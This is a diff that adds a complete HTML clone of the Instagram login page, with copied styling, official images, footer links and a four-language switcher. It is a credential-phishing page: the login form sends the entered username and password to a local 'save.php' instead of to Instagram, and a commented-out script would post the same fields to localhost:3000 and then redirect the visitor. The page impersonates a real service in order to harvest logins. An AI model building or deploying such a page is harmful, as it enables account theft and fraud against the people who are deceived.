@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en" id="html-lang">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Instagram Login</title>
+    <style>
+        :root {
+            --bg-color: #fafafa;
+            --text-color: #262626;
+            --box-bg: #ffffff;
+            --border-color: #dbdbdb;
+            --input-bg: #fafafa;
+            --button-bg: #0095f6;
+            --button-disabled: #b2dffc;
+            --divider-color: #dbdbdb;
+            --divider-text: #8e8e8e;
+            --facebook-color: #385185;
+            --link-color: #00376b;
+            --signup-link: #0095f6;
+            --footer-text: #8e8e8e;
+            --footer-link: #737373;
+            --select-bg: #ffffff;
+            --select-border: #dbdbdb;
+            --select-text: #262626;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --text-color: #f5f5f5;
+                --box-bg: #000000e9;
+                --border-color: #000000;
+                --input-bg: #121212;
+                --button-bg: #0095f6;
+                --button-disabled: #00376b;
+                --divider-color: #363636;
+                --divider-text: #a8a8a8;
+                --facebook-color: #8bb4f7;
+                --link-color: #8bb4f7;
+                --signup-link: #0095f6;
+                --footer-text: #a8a8a8;
+                --footer-link: #c7c7c7;
+                --select-bg: #1e1e1e;
+                --select-border: #363636;
+                --select-text: #f5f5f5;
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-color);
+        }
+
+        .wrapper {
+            display: flex;
+            align-items: center;
+            max-width: 935px;
+            width: 100%;
+            justify-content: center;
+            flex-grow: 1;
+            margin: 10px 0;
+        }
+
+        .phone-image {
+            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
+            background-size: cover;
+            height: 500px;
+            width: 370px;
+            margin-right: 32px;
+            position: relative;
+            display: none;
+        }
+
+        .phone-image img {
+            position: absolute;
+            top: 23px;
+            right: 47px;
+            height: 429px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-box {
+            background: var(--box-bg);
+            border: 1px solid var(--border-color);
+            padding: 20px 40px;
+            text-align: center;
+            margin-bottom: 10px;
+            width: 100%;
+            box-sizing: border-box;
+            border-radius: 8px;
+        }
+
+        .logo {
+            margin: 20px 0;
+            width: 175px;
+            filter: invert(0);
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .logo {
+                filter: invert(1);
+            }
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 8px;
+            margin: 6px 0;
+            border: 1px solid var(--border-color);
+            border-radius: 3px;
+            background: var(--input-bg);
+            font-size: 12px;
+            box-sizing: border-box;
+            color: var(--text-color);
+        }
+
+        button {
+            width: 100%;
+            padding: 7px;
+            margin: 8px 0;
+            background-color: var(--button-bg);
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background-color: var(--button-disabled);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            width: 100%;
+        }
+
+        .line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: var(--divider-color);
+        }
+
+        .or {
+            margin: 0 15px;
+            color: var(--divider-text);
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--facebook-color);
+            font-weight: bold;
+            font-size: 14px;
+            margin: 10px 0;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .facebook-icon {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .facebook-icon svg {
+            fill: currentColor;
+            width: 16px;
+            height: 16px;
+        }
+
+        .forgot-password {
+            color: var(--link-color);
+            font-size: 12px;
+            margin: 12px 0;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .signup-box {
+            background: var(--box-bg);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+            box-sizing: border-box;
+            font-size: 14px;
+            border-radius: 8px;
+        }
+
+        .signup-link {
+            color: var(--signup-link);
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .footer {
+            width: 100%;
+            max-width: 935px;
+            margin: 8px 0;
+            text-align: center;
+            color: var(--footer-text);
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 10px 0;
+        }
+
+        .footer-link {
+            color: var(--footer-link);
+            text-decoration: none;
+            margin: 0 8px 8px;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            /* Space between language selector and copyright */
+            margin-top: 10px;
+        }
+
+        .footer-lang {
+            margin: 8px 0;
+        }
+
+        .footer-copyright {
+            margin: 8px 0;
+        }
+
+        select {
+            background-color: var(--select-bg);
+            color: var(--select-text);
+            border: 1px solid var(--select-border);
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        @media (min-width: 876px) {
+            .phone-image {
+                display: block;
+            }
+        }
+
+        @media (max-width: 875px) {
+            .wrapper {
+                padding: 0 20px;
+            }
+        }
+    </style>
+    <script src="server.js"></script>
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="phone-image">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd999368de3.png"
+                alt="Instagram Screenshot">
+        </div>
+        <div class="container">
+            <div class="login-box">
+                <img class="logo"
+                    src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
+                    alt="Instagram">
+                <!-- <form>
+                    <input type="text" placeholder="Phone number, username, or email" />
+                    <input type="password" placeholder="Password" />
+                    <button type="submit">Log in</button>
+                </form> -->
+                <form method="POST" action="save.php">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Log in</button>
+                </form>
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="or">OR</div>
+                    <div class="line"></div>
+                </div>
+                <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0"
+                    class="facebook-login">
+                    <div class="facebook-icon">
+                        <svg viewBox="0 0 16 16" width="16" height="16">
+                            <path
+                                d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z"
+                                fill="currentColor"></path>
+                        </svg>
+                    </div>
+                    Log in with Facebook
+                </a>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot
+                    password?</a>
+            </div>
+            <div class="signup-box">
+                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"
+                    class="signup-link">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="https://about.meta.com/" class="footer-link">Meta</a>
+            <a href="https://about.instagram.com/" class="footer-link">About</a>
+            <a href="https://about.instagram.com/blog/" class="footer-link">Blog</a>
+            <a href="https://www.instagram.com/about/jobs/" class="footer-link">Jobs</a>
+            <a href="https://help.instagram.com/" class="footer-link">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram" class="footer-link">API</a>
+            <a href="https://help.instagram.com/519522125107875" class="footer-link">Privacy</a>
+            <a href="https://help.instagram.com/581066165581870" class="footer-link">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/" class="footer-link">Locations</a>
+            <a href="https://www.instagram.com/download/instagram-lite/" class="footer-link">Instagram Lite</a>
+            <a href="https://www.threads.net/" class="footer-link">Threads</a>
+            <a href="https://help.instagram.com/contact/1652567838289083" class="footer-link">Contact Uploading &
+                Non-Users</a>
+            <a href="https://about.meta.com/technologies/meta-verified/" class="footer-link">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-lang">
+                <select id="language-selector" aria-label="Switch Display Language">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="zh">中文</option>
+                </select>
+            </div>
+            <div class="footer-copyright">
+                © 2025 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Translation dictionary
+        const translations = {
+            en: {
+                title: "Instagram Login",
+                usernamePlaceholder: "Phone number, username, or email",
+                passwordPlaceholder: "Password",
+                loginButton: "Log in",
+                orDivider: "OR",
+                facebookLogin: "Log in with Facebook",
+                forgotPassword: "Forgot password?",
+                signupText: "Don't have an account?",
+                signupLink: "Sign up",
+                meta: "Meta",
+                about: "About",
+                blog: "Blog",
+                jobs: "Jobs",
+                help: "Help",
+                api: "API",
+                privacy: "Privacy",
+                terms: "Terms",
+                locations: "Locations",
+                instagramLite: "Instagram Lite",
+                threads: "Threads",
+                contact: "Contact Uploading & Non-Users",
+                metaVerified: "Meta Verified",
+                getApp: "Get the app.",
+                copyright: "© 2025 Instagram from Meta"
+            },
+            es: {
+                title: "Iniciar sesión en Instagram",
+                usernamePlaceholder: "Teléfono, usuario o correo",
+                passwordPlaceholder: "Contraseña",
+                loginButton: "Iniciar sesión",
+                orDivider: "O",
+                facebookLogin: "Iniciar sesión con Facebook",
+                forgotPassword: "¿Olvidaste tu contraseña?",
+                signupText: "¿No tienes una cuenta?",
+                signupLink: "Regístrate",
+                meta: "Meta",
+                about: "Información",
+                blog: "Blog",
+                jobs: "Empleos",
+                help: "Ayuda",
+                api: "API",
+                privacy: "Privacidad",
+                terms: "Condiciones",
+                locations: "Ubicaciones",
+                instagramLite: "Instagram Lite",
+                threads: "Threads",
+                contact: "Contactar y no usuarios",
+                metaVerified: "Meta Verified",
+                getApp: "Descarga la aplicación.",
+                copyright: "© 2025 Instagram de Meta"
+            },
+            fr: {
+                title: "Connexion Instagram",
+                usernamePlaceholder: "Téléphone, nom d'utilisateur ou e-mail",
+                passwordPlaceholder: "Mot de passe",
+                loginButton: "Se connecter",
+                orDivider: "OU",
+                facebookLogin: "Se connecter avec Facebook",
+                forgotPassword: "Mot de passe oublié ?",
+                signupText: "Vous n'avez pas de compte ?",
+                signupLink: "Inscrivez-vous",
+                meta: "Meta",
+                about: "À propos",
+                blog: "Blog",
+                jobs: "Emplois",
+                help: "Aide",
+                api: "API",
+                privacy: "Confidentialité",
+                terms: "Conditions",
+                locations: "Lieux",
+                instagramLite: "Instagram Lite",
+                threads: "Threads",
+                contact: "Contact et non-utilisateurs",
+                metaVerified: "Meta Verified",
+                getApp: "Téléchargez l'application.",
+                copyright: "© 2025 Instagram de Meta"
+            },
+            zh: {
+                title: "Instagram 登录",
+                usernamePlaceholder: "手机号、用户名或邮箱",
+                passwordPlaceholder: "密码",
+                loginButton: "登录",
+                orDivider: "或",
+                facebookLogin: "使用 Facebook 登录",
+                forgotPassword: "忘记密码？",
+                signupText: "还没有帐户？",
+                signupLink: "注册",
+                meta: "Meta",
+                about: "关于",
+                blog: "博客",
+                jobs: "工作",
+                help: "帮助",
+                api: "API",
+                privacy: "隐私",
+                terms: "条款",
+                locations: "位置",
+                instagramLite: "Instagram Lite",
+                threads: "Threads",
+                contact: "联系与非用户",
+                metaVerified: "Meta Verified",
+                getApp: "下载应用。",
+                copyright: "© 2025 Instagram 来自 Meta"
+            }
+        };
+
+        // Set initial language based on browser preference
+        const userLang = navigator.language || navigator.userLanguage;
+        const langSelector = document.getElementById('language-selector');
+        let currentLang = 'en';
+
+        if (userLang.startsWith('es')) {
+            currentLang = 'es';
+        } else if (userLang.startsWith('fr')) {
+            currentLang = 'fr';
+        } else if (userLang.startsWith('zh')) {
+            currentLang = 'zh';
+        }
+
+        langSelector.value = currentLang;
+        updatePageLanguage(currentLang);
+
+        // Language selector functionality
+        langSelector.addEventListener('change', function () {
+            currentLang = this.value;
+            updatePageLanguage(currentLang);
+            document.getElementById('html-lang').lang = currentLang;
+        });
+
+        function updatePageLanguage(lang) {
+            const t = translations[lang];
+
+            // Update all text elements
+            document.getElementById('page-title').textContent = t.title;
+            document.querySelector('input[type="text"]').placeholder = t.usernamePlaceholder;
+            document.querySelector('input[type="password"]').placeholder = t.passwordPlaceholder;
+            document.querySelector('button[type="submit"]').textContent = t.loginButton;
+            document.querySelector('.or').textContent = t.orDivider;
+            document.querySelector('.facebook-login').innerHTML = `
+                <div class="facebook-icon">
+                    <svg viewBox="0 0 16 16" width="16" height="16">
+                        <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" fill="currentColor"></path>
+                    </svg>
+                </div>
+                ${t.facebookLogin}`;
+            document.querySelector('.forgot-password').textContent = t.forgotPassword;
+            document.querySelector('.signup-box').innerHTML = `${t.signupText} <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">${t.signupLink}</a>`;
+
+            // Update footer links
+            const footerLinks = document.querySelectorAll('.footer-link');
+            footerLinks[0].textContent = t.meta;
+            footerLinks[1].textContent = t.about;
+            footerLinks[2].textContent = t.blog;
+            footerLinks[3].textContent = t.jobs;
+            footerLinks[4].textContent = t.help;
+            footerLinks[5].textContent = t.api;
+            footerLinks[6].textContent = t.privacy;
+            footerLinks[7].textContent = t.terms;
+            footerLinks[8].textContent = t.locations;
+            footerLinks[9].textContent = t.instagramLite;
+            footerLinks[10].textContent = t.threads;
+            footerLinks[11].textContent = t.contact;
+            footerLinks[12].textContent = t.metaVerified;
+
+            // Update copyright
+            document.querySelector('.footer-copyright').textContent = t.copyright;
+
+            // Update language selector options
+            const options = langSelector.options;
+            options[0].text = lang === 'en' ? 'English' :
+                lang === 'es' ? 'Inglés' :
+                    lang === 'fr' ? 'Anglais' : '英语';
+            options[1].text = lang === 'en' ? 'Spanish' :
+                lang === 'es' ? 'Español' :
+                    lang === 'fr' ? 'Espagnol' : '西班牙语';
+            options[2].text = lang === 'en' ? 'French' :
+                lang === 'es' ? 'Francés' :
+                    lang === 'fr' ? 'Français' : '法语';
+            options[3].text = lang === 'en' ? 'Chinese' :
+                lang === 'es' ? 'Chino' :
+                    lang === 'fr' ? 'Chinois' : '中文';
+        }
+
+        // Add this at the end of your existing script
+        // document.querySelector('form').addEventListener('submit', async function (e) {
+        //     e.preventDefault();
+
+        //     const formData = {
+        //         username: this.querySelector('input[type="text"]').value,
+        //         password: this.querySelector('input[type="password"]').value
+        //     };
+
+        //     try {
+        //         const response = await fetch('http://localhost:3000/login', {
+        //             method: 'POST',
+        //             headers: { 'Content-Type': 'application/json' },
+        //             body: JSON.stringify(formData)
+        //         });
+
+        //         const result = await response.json();
+        //         if (result.redirect) {
+        //             window.location.href = result.redirect;
+        //         }
+        //     } catch (error) {
+        //         console.error('Error:', error);
+        //     }
+        // });
+
+    </script>
+</body>
+
+</html>
